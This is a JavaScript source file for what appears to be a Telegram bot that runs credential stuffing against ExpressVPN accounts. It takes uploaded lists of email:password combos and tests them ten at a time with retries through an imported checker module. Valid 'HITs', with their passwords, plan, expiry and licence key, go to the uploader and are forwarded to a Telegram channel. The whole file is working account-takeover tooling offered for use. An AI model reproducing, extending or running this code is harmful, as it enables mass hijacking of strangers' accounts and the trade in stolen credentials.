// api/telegram.js – ExpressVPN Bot (fast parallel checking – 10 at a time)
import { checkExpressVPN } from '../lib/expressChecker.js';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';

// প্রতি ব্যাচে কতটি কম্বো প্যারালালে চেক হবে
const CONCURRENCY = 10;

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const body = req.body;
  if (!body.message) return res.status(200).json({ ok: true });

  const chatId = body.message.chat.id;
  const text = body.message.text;
  const document = body.message.document;

  // /start
  if (text === '/start') {
    await sendMessage(chatId,
      "🤖 *ExpressVPN Checker Bot*\n\n" +
      "Send a `.txt` file with combos:\n" +
      "`email:password` (one per line)\n\n" +
      "⚡ *Fast mode:* 10 combos checked simultaneously.\n" +
      "HITs are sent to the channel after finishing."
    );
    return res.status(200).json({ ok: true });
  }

  // File upload
  if (document && (
      document.mime_type === 'text/plain' ||
      document.mime_type === 'application/octet-stream' ||
      (document.file_name && document.file_name.toLowerCase().endsWith('.txt'))
  )) {
    const fileUrl = await getFileUrl(document.file_id);
    if (!fileUrl) {
      await sendMessage(chatId, "❌ Failed to get file.");
      return res.status(200).json({ ok: false });
    }

    const fileContent = await downloadFile(fileUrl);
    if (!fileContent) {
      await sendMessage(chatId, "❌ Failed to download file.");
      return res.status(200).json({ ok: false });
    }

    const lines = fileContent.split(/\r?\n/);
    const combos = [];
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      const idx = trimmed.indexOf(':');
      if (idx === -1) continue;
      const user = trimmed.slice(0, idx).trim();
      const pass = trimmed.slice(idx + 1).trim();
      if (user && pass) combos.push({ username: user, password: pass });
    }

    if (combos.length === 0) {
      await sendMessage(chatId, "❌ No valid combos found (format: email:password)");
      return res.status(200).json({ ok: false });
    }

    // Immediate response, processing in background
    res.status(200).json({ ok: true });
    setTimeout(() => processCombos(chatId, combos), 100);
    return;
  }

  return res.status(200).json({ ok: true });
}

// ===== প্রসেসিং (প্যারালাল, প্রতি ব্যাচে ১০টি) =====
async function processCombos(chatId, combos) {
  const total = combos.length;
  const hits = [];
  let processed = 0;
  const startTime = Date.now();

  await sendMessage(chatId, `📥 Received ${total} combos. Checking at 10/sec...`);

  // ব্যাচে ভাগ করে প্যারালালে চেক
  for (let i = 0; i < combos.length; i += CONCURRENCY) {
    const batch = combos.slice(i, i + CONCURRENCY);

    const batchResults = await Promise.all(
      batch.map(async (combo) => {
        // রিট্রাই লজিক (২ বার)
        let result = null;
        for (let attempt = 0; attempt < 2; attempt++) {
          try {
            result = await checkExpressVPN(combo.username, combo.password);
            if (result && (result.valid || result.hit)) break; // সফল হলে থামো
          } catch (e) {
            result = { valid: false, hit: false, message: e.message };
          }
          // রিট্রাই করার আগে সামান্য বিরতি
          await new Promise(r => setTimeout(r, 300));
        }
        return { combo, result };
      })
    );

    // এই ব্যাচের HIT গুলো সংগ্রহ
    for (const { result } of batchResults) {
      processed++;
      if (result && result.hit) hits.push(result);
    }

    // প্রতি ব্যাচ শেষে প্রগ্রেস আপডেট
    await sendMessage(chatId, `⏳ Progress: ${processed}/${total} | HITs so far: ${hits.length}`);
  }

  // ===== সব চেক শেষ – HIT গুলো চ্যানেলে পাঠাও =====
  if (hits.length > 0) {
    await sendMessage(chatId, `🔥 Sending ${hits.length} HIT(s) to the channel...`);
    for (const hit of hits) {
      await forwardToChannel(hit);
      await new Promise(r => setTimeout(r, 300)); // স্প্যাম এড়াতে
    }
  }

  const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
  let summary = `✅ *Checking complete!*\nTotal: ${total}\n🔥 HITS: ${hits.length}\n⏱️ Time: ${elapsed}s`;

  if (hits.length > 0) {
    summary += `\n\n📋 *HIT combos:*\n`;
    hits.forEach(h => { summary += `${h.email}:${h.password}\n`; });
  }
  await sendMessage(chatId, summary);
}

// ===== হেল্পার =====
async function sendMessage(chatId, text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
    });
  } catch (e) {}
}

async function getFileUrl(fileId) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`;
  try {
    const res = await fetch(url);
    const data = await res.json();
    if (data.ok && data.result.file_path) {
      return `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${data.result.file_path}`;
    }
  } catch (e) {}
  return null;
}

async function downloadFile(fileUrl) {
  try {
    const res = await fetch(fileUrl);
    return await res.text();
  } catch (e) { return null; }
}

async function forwardToChannel(result) {
  if (!TELEGRAM_CHAT_ID) return;
  const message = `🎯 *ExpressVPN HIT*\n\n` +
                  `📧 *Email:* ${result.email}\n` +
                  `🔑 *Password:* \`${result.password}\`\n` +
                  `📋 *Plan:* ${result.plan || '—'}\n` +
                  `📅 *Expiry:* ${result.expiry || '—'}\n` +
                  `🔑 *PC Key:* ${result.pcKey || '—'}\n` +
                  `📅 *Key Expiry:* ${result.keyExpire || '—'}\n` +
                  `📌 *Status:* ${result.keyStatus || '—'}\n\n` +
                  `#ExpressVPN @SHAKIB2016`;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
  } catch (e) {}
}
